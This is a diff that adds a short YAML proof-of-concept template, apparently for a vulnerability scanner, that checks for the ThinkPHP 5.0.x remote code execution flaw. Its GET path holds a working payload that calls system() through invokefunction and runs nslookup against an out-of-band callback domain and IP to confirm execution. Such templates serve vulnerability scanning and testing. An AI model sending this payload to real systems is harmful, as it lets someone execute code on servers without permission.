@@ -1,0 +1,16 @@
+name: poc-yaml-thinkphp5.0.x-rcebind
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+  reverseIP: reverse.ip
+rules:
+  - method: GET
+    path : "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=nslookup%20{{reverseDomain}}%20{{reverseIP}}"
+    # path: "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=nslookup%20{{reverseDomain}}%20{{reverseIP}}"
+    expression: |
+      response.status==200 && reverse.wait(5)
+
+detail:
+  author: yumu
+  links: 
+    - https://www.jianshu.com/p/6e3f29bd8830
